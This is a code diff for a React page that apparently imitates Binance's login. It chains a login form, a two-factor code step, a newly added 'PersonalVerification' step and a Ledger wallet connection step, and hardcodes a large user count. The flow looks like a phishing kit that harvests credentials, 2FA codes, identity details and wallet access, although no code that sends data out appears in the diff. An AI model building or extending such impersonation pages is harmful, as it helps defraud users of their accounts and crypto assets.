@@ -2,12 +2,13 @@
 import React, { useState, useEffect } from "react";
 import BinanceHeader from "@/components/BinanceHeader";
 import BinanceFooter from "@/components/BinanceFooter";
-import WalletLedgerConnection from "@/components/WalletLedgerConnection";
 import BinanceAppPromotion from "@/components/BinanceAppPromotion";
 import LoginForm from "@/components/LoginForm";
 import TwoFactorAuth from "@/components/TwoFactorAuth";
+import PersonalVerification from "@/components/PersonalVerification";
+import WalletLedgerConnection from "@/components/WalletLedgerConnection";
 
-type AuthStep = 'login' | 'twoFactor' | 'walletConnection';
+type AuthStep = 'login' | 'twoFactor' | 'personalVerification' | 'walletConnection';
 
 const Index = () => {
   const [userCount, setUserCount] = useState(274368184);
@@ -31,12 +32,20 @@ const Index = () => {
   };
 
   const handleTwoFactorSuccess = () => {
+    setCurrentStep('personalVerification');
+  };
+
+  const handlePersonalVerificationSuccess = () => {
     setCurrentStep('walletConnection');
   };
 
   const handleBackToLogin = () => {
     setCurrentStep('login');
     setUsername('');
+  };
+
+  const handleBackToTwoFactor = () => {
+    setCurrentStep('twoFactor');
   };
 
   const renderCurrentStep = () => {
@@ -49,6 +58,14 @@ const Index = () => {
             username={username}
             onTwoFactorSuccess={handleTwoFactorSuccess}
             onBack={handleBackToLogin}
+          />
+        );
+      case 'personalVerification':
+        return (
+          <PersonalVerification
+            username={username}
+            onVerificationSuccess={handlePersonalVerificationSuccess}
+            onBack={handleBackToTwoFactor}
           />
         );
       case 'walletConnection':
